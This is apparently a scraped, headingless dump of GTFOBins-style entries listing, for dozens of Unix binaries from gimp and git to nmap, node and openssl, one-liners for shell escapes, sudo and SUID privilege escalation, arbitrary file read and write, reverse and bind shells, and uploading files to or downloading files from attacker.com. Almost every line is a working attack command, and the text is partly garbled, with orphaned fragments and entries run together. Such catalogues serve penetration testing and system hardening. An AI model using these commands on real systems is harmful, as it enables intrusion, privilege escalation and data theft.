sudo genisoimage -q -o - "$LFILE"
export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
export LPORT=8888
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])'
gimp -idf --batch-interpreter=python-fu-eval -b 'open("file_to_write", "wb").write("DATA")'
ginsh
!/bin/sh
./ginsh
!/bin/sh
sudo ginsh
!/bin/sh
git help config
!/bin/sh
git branch --help config
!/bin/sh
TF=$(mktemp -d)
git init "$TF"
echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
git -C "$TF" commit --allow-empty -m x
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
git "--exec-path=$TF" x
LFILE=file_to_read
git diff /dev/null $LFILE
git apply --unsafe-paths --directory / x.patch
sudo git -p help config
!/bin/sh
sudo git branch --help config
!/bin/sh
TF=$(mktemp -d)
git init "$TF"
echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
sudo git -C "$TF" commit --allow-empty -m x
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x
LFILE=file_to_read
grep '' $LFILE
LFILE=file_to_read
./grep '' $LFILE
LFILE=file_to_read
sudo grep '' $LFILE
LFILE=file_to_write
gtester "DATA" -o $LFILE
TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF
TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF
TF=$(mktemp)
echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF
LFILE=file_to_read
gzip -f $LFILE -t
LFILE=file_to_read
gzip -c $LFILE | gzip -d
LFILE=file_to_read
./gzip -f $LFILE -t
LFILE=file_to_read
sudo gzip -f $LFILE -t
LFILE=file_to_read
hd "$LFILE"
LFILE=file_to_read
./hd "$LFILE"
LFILE=file_to_read
sudo hd "$LFILE"
LFILE=file_to_read
head -c1G "$LFILE"
LFILE=file_to_read
./head -c1G "$LFILE"
LFILE=file_to_read
sudo head -c1G "$LFILE"
LFILE=file_to_read
hexdump -C "$LFILE"
LFILE=file_to_read
./hexdump -C "$LFILE"
LFILE=file_to_read
sudo hexdump -C "$LFILE"
LFILE=file_to_read
highlight --no-doc --failsafe "$LFILE"
LFILE=file_to_read
./highlight --no-doc --failsafe "$LFILE"
LFILE=file_to_read
sudo highlight --no-doc --failsafe "$LFILE"
hping3
/bin/sh
./hping3
/bin/sh -p
sudo hping3
/bin/sh
The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:
```
sudo hping3 --icmp --listen xxx --dump
```
RHOST=attacker.com
LFILE=file_to_read
sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
LFILE=file_to_write
echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 "$LFILE"
LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
iftop
!/bin/sh
./iftop
!/bin/sh
sudo iftop
!/bin/sh
LFILE=file_to_change
TF=$(mktemp)
./install -m 6777 $LFILE $TF
LFILE=file_to_change
TF=$(mktemp)
sudo install -m 6777 $LFILE $TF
LFILE=file_to_read
ip -force -batch "$LFILE"
LFILE=file_to_read
./ip -force -batch "$LFILE"
./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo
LFILE=file_to_read
sudo ip -force -batch "$LFILE"
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo
sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar
irb
exec '/bin/bash'
export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
irb
File.open("file_to_write", "w+") { |f| f.write("DATA") }
irb
puts File.read("file_to_read")
irb
require "fiddle"; Fiddle.dlopen("lib.so")
sudo irb
exec '/bin/bash'
ispell /etc/passwd
!/bin/sh
./ispell /etc/passwd
!/bin/sh -p
sudo ispell /etc/passwd
!/bin/sh
export RHOST=attacker.com
export RPORT=12345
echo 'var host=Java.type("java.lang.System").getenv("RHOST");
var port=Java.type("java.lang.System").getenv("RPORT");
var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var Socket = Java.type("java.net.Socket");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo "var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();" | jjs
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("./file_to_write");
fw.write("DATA");
fw.close();' | jjs
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("file_to_read"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
joe
^K!/bin/sh
./joe
^K!/bin/sh
sudo joe
^K!/bin/sh
LFILE=file_to_read
join -a 2 /dev/null $LFILE
LFILE=file_to_read
./join -a 2 /dev/null $LFILE
LFILE=file_to_read
sudo join -a 2 /dev/null $LFILE
journalctl
!/bin/sh
sudo journalctl
!/bin/sh
LFILE=file_to_read
jq -Rr . "$LFILE"
LFILE=file_to_read
./jq -Rr . "$LFILE"
LFILE=file_to_read
sudo jq -Rr . "$LFILE"
export RHOST=attacker.com
export RPORT=12345
jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
URL=http://attacker.com/file_to_get
LFILE=file_to_save
jrunscript -e "cp('$URL','$LFILE')"
while ((line = br.readLine()) != null) { print(line); }'
julia -e 'run(`/bin/sh`)'
export LFILE=file_to_read
julia -e 'print(open(f->read(f, String), ENV["LFILE"]))'
export LFILE=file_to_write
julia -e 'open(f->write(f, "DATA"), ENV["LFILE"], "w")'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
julia -e 'download(ENV["URL"], ENV["LFILE"])'
export RHOST=attacker.com
export RPORT=12345
julia -e 'using Sockets; sock=connect(ENV["RHOST"], parse(Int64,ENV["RPORT"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
./julia -e 'run(`/bin/sh -p`)'
sudo julia -e 'run(`/bin/sh`)'
knife exec -E 'exec "/bin/sh"'
sudo knife exec -E 'exec "/bin/sh"'
export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'
export LFILE=file_to_read
ksh -c 'echo "$(<$LFILE)"'
export LFILE=file_to_read
ksh -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
LFILE=file_to_read
ksshell -i $LFILE
LFILE=file_to_read
./ksshell -i $LFILE
LFILE=file_to_read
sudo ksshell -i $LFILE
LFILE=dir_to_serve
kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
LFILE=dir_to_serve
./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
LFILE=dir_to_serve
sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
latexmk -e 'exec "/bin/sh";'
latexmk -latex='/bin/sh #' /dev/null
latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
TF=$(mktemp)
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
strings tmp.dvi
libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)
TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
sudo ldconfig -f "$TF/conf"
TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
./ldconfig -f "$TF/conf"
less /etc/profile
!/bin/sh
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
less /etc/profile
v:shell
less /etc/profile
:e file_to_read
echo DATA | less
sfile_to_write
q
less file_to_write
v
sudo less /etc/profile
!/bin/sh
LFILE=file_to_read
links "$LFILE"
LFILE=file_to_read
./links "$LFILE"
LFILE=file_to_read
sudo links "$LFILE"
sudo ln -fs /bin/sh /bin/ln
sudo ln
loginctl user-status
!/bin/sh
sudo loginctl user-status
!/bin/sh
LFILE=file_to_read
look '' "$LFILE"
LFILE=file_to_read
./look '' "$LFILE"
LFILE=file_to_read
sudo look '' "$LFILE"
To collect the file run the following on the attacker box (this requires `cups` to be installed):
1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;
2. `lpadmin -d printer` to set the new printer as default;
3. `cupsctl --remote-any` to enable printing from the Internet;
4. `nc -lkp 9100` to receive the file.
Send a local file to a CUPS server.
LFILE=file_to_send
RHOST=attacker.com
lp $LFILE -h $RHOST
LFILE=file_to_read
ltrace -F $LFILE /dev/null
LFILE=file_to_write
ltrace -s 999 -o $LFILE ltrace -F DATA
export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();'
export LPORT=12345
lua -e 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();'
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
lua -e '
local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();'
< "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);'
URL=http://attacker.com/file_to_get
LFILE=file_to_save
lwp-download $URL $LFILE
URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo lwp-download $URL $LFILE
LFILE=file_to_read
TF=$(mktemp)
lwp-download "file://$LFILE" $TF
cat $TF
LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
lwp-download file://$TF $LFILE
LFILE=file_to_read
lwp-request "file://$LFILE"
LFILE=file_to_read
sudo lwp-request "file://$LFILE"
TF=$(mktemp)
echo "From nobody@localhost $(date)" > $TF
mail -f $TF
!/bin/sh
COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'"$COMMAND"
LFILE=file_to_write
make -s --eval="\$(file >$LFILE,DATA)" .
COMMAND='/bin/sh -p'
./make -s --eval=$'x:\n\t-'"$COMMAND"
COMMAND='/bin/sh'
sudo make -s --eval=$'x:\n\t-'"$COMMAND"
man man
!/bin/sh
man '-H/bin/sh #' man
sudo man man
!/bin/sh
LFILE=file_to_write
mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
LFILE=file_to_read
mawk '//' "$LFILE"
LFILE=file_to_read
./mawk '//' "$LFILE"
Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
minicom -D /dev/null
After the shell, exit with `Ctrl-A x`.
TF=$(mktemp)
echo "! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)" >$TF
minicom -D /dev/null -S $TF
reset^J
Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
sudo minicom -D /dev/null
Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh -p`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
./minicom -D /dev/null
TERM= more /etc/profile
!/bin/sh
TERM= sudo more /etc/profile
!/bin/sh
LFILE=file_to_read
mosquitto -c "$LFILE"
LFILE=file_to_read
./mosquitto -c "$LFILE"
LFILE=file_to_read
sudo mosquitto -c "$LFILE"
sudo mount -o bind /bin/sh /bin/mount
sudo mount
sudo msfconsole
msf6 > irb
>> system("/bin/sh")
sudo msfconsole
msf6 > irb
>> system("/bin/sh")
LFILE=file_to_read
msgattrib -P $LFILE
LFILE=file_to_read
sudo msgattrib -P $LFILE
LFILE=file_to_read
./msgattrib -P $LFILE
LFILE=file_to_read
msgcat -P $LFILE
LFILE=file_to_read
sudo msgcat -P $LFILE
LFILE=file_to_read
./msgcat -P $LFILE
LFILE=file_to_read
msgconv -P $LFILE
LFILE=file_to_read
sudo msgconv -P $LFILE
LFILE=file_to_read
./msgconv -P $LFILE
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
LFILE=file_to_read
msgfilter -P -i "LFILE" /bin/cat
echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
LFILE=file_to_read
msgmerge -P $LFILE /dev/null
LFILE=file_to_read
sudo msgmerge -P $LFILE /dev/null
LFILE=file_to_read
./msgmerge -P $LFILE /dev/null
LFILE=file_to_read
msguniq -P $LFILE
LFILE=file_to_read
sudo msguniq -P $LFILE
LFILE=file_to_read
./msguniq -P $LFILE
LFILE=file_to_read
mtr --raw -F "$LFILE"
LFILE=file_to_read
sudo mtr --raw -F "$LFILE"
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./mv $TF $LFILE
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo mv $TF $LFILE
A MySQL server must accept connections in order for this to work.
The following loads the `/path/to/lib.so` shared object.
nano
^R^X
reset; sh 1>&0 2>&0
nano -s /bin/sh
/bin/sh
^T
nano file_to_write
DATA
^O
./nano -s /bin/sh
/bin/sh
^T
sudo nano
^R^X
reset; sh 1>&0 2>&0
LFILE=file_to_read
nasm -@ $LFILE
LFILE=file_to_read
./nasm -@ $LFILE
LFILE=file_to_read
sudo nasm -@ $LFILE
RHOST=attacker.com
RPORT=12345
nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = "/inet/tcp/0/" RHOST "/" RPORT;
while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
LPORT=12345
nawk -v LPORT=$LPORT 'BEGIN {
s = "/inet/tcp/" LPORT "/0/0";
while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
LFILE=file_to_write
nawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
LFILE=file_to_read
nawk '//' "$LFILE"
LFILE=file_to_read
./nawk '//' "$LFILE"
RHOST=attacker.com
RPORT=12345
nc -e /bin/sh $RHOST $RPORT
LPORT=12345
nc -l -p $LPORT -e /bin/sh
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
nc $RHOST $RPORT < "$LFILE"
LPORT=12345
LFILE=file_to_save
nc -l -p $LPORT > "$LFILE"
RHOST=attacker.com
RPORT=12345
sudo nc -e /bin/sh $RHOST $RPORT
RHOST=attacker.com
RPORT=12345
./nc -e /bin/sh $RHOST $RPORT
ncdu
b
sudo ncdu
b
./ncdu
b
ncftp
!/bin/sh
./ncftp
!/bin/sh -p
sudo ncftp
!/bin/sh
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
neofetch --config $TF
LFILE=file_to_read
neofetch --ascii $LFILE
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF
LFILE=file_to_read
nft -f "$LFILE"
LFILE=file_to_read
./nft -f "$LFILE"
LFILE=file_to_read
sudo nft -f "$LFILE"
LFILE=file_to_read
nl -bn -w1 -s '' $LFILE
LFILE=file_to_read
./nl -bn -w1 -s '' $LFILE
LFILE=file_to_read
sudo nl -bn -w1 -s '' $LFILE
LFILE=file_to_read
nm @$LFILE
LFILE=file_to_read
./nm @$LFILE
LFILE=file_to_read
sudo nm @$LFILE
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
nmap --interactive
nmap> !sh
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF
export LPORT=12345
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF
RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();' > $TF
nmap --script=$TF
RHOST=attacker.com
RPORT=8080
TF=$(mktemp -d)
LFILE=file_to_save
nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF
TF=$(mktemp)
echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
nmap --script=$TF
LFILE=file_to_write
nmap -oG=$LFILE DATA
TF=$(mktemp)
echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
nmap --script=$TF
nmap -iL file_to_read
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
sudo nmap --interactive
nmap> !sh
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF
LFILE=file_to_write
./nmap -oG=$LFILE DATA
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
export URL=http://attacker.com
export LFILE=file_to_send
node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
export RHOST=attacker.com
export RPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(process.env.RPORT, process.env.RHOST, function () {
this.pipe(sh.stdin);
sh.stdout.pipe(this);
sh.stderr.pipe(this);
})'
export LPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
}).listen(process.env.LPORT)'
./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
COMMAND='/usr/bin/id'
nohup "$COMMAND"
cat nohup.out
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
npm -C $TF i
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
LFILE=file_to_read
nroff $LFILE
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff
LFILE=file_to_read
ntpdate -a x -k $LFILE -d localhost
LFILE=file_to_read
sudo ntpdate -a x -k $LFILE -d localhost
LFILE=file_to_read
./ntpdate -a x -k $LFILE -d localhost
LFILE=file_to_read
od -An -c -w9999 "$LFILE"
LFILE=file_to_read
./od -An -c -w9999 "$LFILE"
LFILE=file_to_read
sudo od -An -c -w9999 "$LFILE"
To receive the shell run the following on the attacker box:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
Communication between attacker and target will be encrypted.
RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
To collect the file run the following on the attacker box:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
Send a local file via TCP. Transmission will be encrypted.
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
To send the file run the following on the attacker box:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send
Fetch a file from a TCP port, transmission will be encrypted.
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
openssl enc -in "$TF" -out "$LFILE"
LFILE=file_to_read
openssl enc -in "$LFILE"
To receive the shell run the following on the attacker box:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
Communication between attacker and target will be encrypted.
RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
To receive the shell run the following on the attacker box:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
Communication between attacker and target will be encrypted.
RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
LFILE=file_to_read
openvpn --config "$LFILE"
./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
LFILE=file_to_read
./openvpn --config "$LFILE"
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
LFILE=file_to_read
sudo openvpn --config "$LFILE"
COMMAND=id
TF=$(mktemp -u)
sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
cat $TF
It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```
sudo opkg install x_1.0_all.deb
LFILE=file_to_read
pandoc -t plain "$LFILE"
LFILE=file_to_write
echo DATA | pandoc -t plain -o "$LFILE"
TF=$(mktemp)
echo 'os.execute("/bin/sh")' >$TF
pandoc -L $TF /dev/null
LFILE=file_to_write
echo DATA | ./pandoc -t plain -o "$LFILE"
TF=$(mktemp)
echo 'os.execute("/bin/sh")' >$TF
./pandoc -L $TF /dev/null
TF=$(mktemp)
echo 'os.execute("/bin/sh")' >$TF
sudo pandoc -L $TF /dev/null
LFILE=file_to_read
paste $LFILE
LFILE=file_to_read
paste $LFILE
LFILE=file_to_read
sudo paste $LFILE
LFILE=file_to_read
pax -w "$LFILE"
TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
pdb $TF
cont
TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
sudo pdb $TF
cont
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -
sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -
